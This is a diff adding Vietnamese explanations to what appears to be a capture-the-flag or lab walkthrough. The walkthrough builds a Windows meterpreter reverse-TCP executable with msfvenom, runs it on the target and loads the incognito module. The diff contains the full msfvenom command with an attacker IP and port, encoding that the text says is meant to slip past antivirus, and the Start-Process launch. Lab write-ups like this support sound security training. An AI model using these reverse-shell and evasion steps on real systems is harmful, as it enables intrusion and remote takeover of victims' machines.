@@ -134,6 +134,15 @@ PS C:\Users\bruce\Desktop> more user.txt
 79007a09481963edf2e1321abd9ae2a0
 ```
 
+Sử dụng msfvenom để tạo Windows <br>
+
+Tấn công đảo ngược shell sử dụng payload sau: <br>
+
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
+
+Tải trọng này tạo ra một gói TCP ngược x86-64 được mã hóa.<br>
+Tải trọng (payload). Tải trọng thường được mã hóa để đảm bảo chúng được truyền tải chính xác và cũng để tránh bị các phần mềm chống virus phát hiện. Phần mềm chống virus có thể không nhận ra tải trọng và sẽ không gắn cờ nó là độc hại. <br>
+
 ┌──(kali㉿kali)-[~] <br>
 └─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=192.168.175.163 LPORT=1234 -f exe -o shell-name.exe
 
@@ -217,6 +226,8 @@ msf exploit(multi/handler) > run <br>
 
 PS C:\Users\bruce\Desktop> Start-Process "shell-name.exe"
 <img width="935" height="127" alt="image" src="https://github.com/user-attachments/assets/11993ad6-393a-467d-ba59-cc77d7afd2bf" />
+
+Nhập: `load incognito` để tải mô-đun ẩn danh trong Metasploit. Xin lưu ý rằng bạn có thể cần sử dụng lệnh `use incognito` nếu lệnh trước đó không hoạt động. <br>
 
 meterpreter > use incognito
 ```
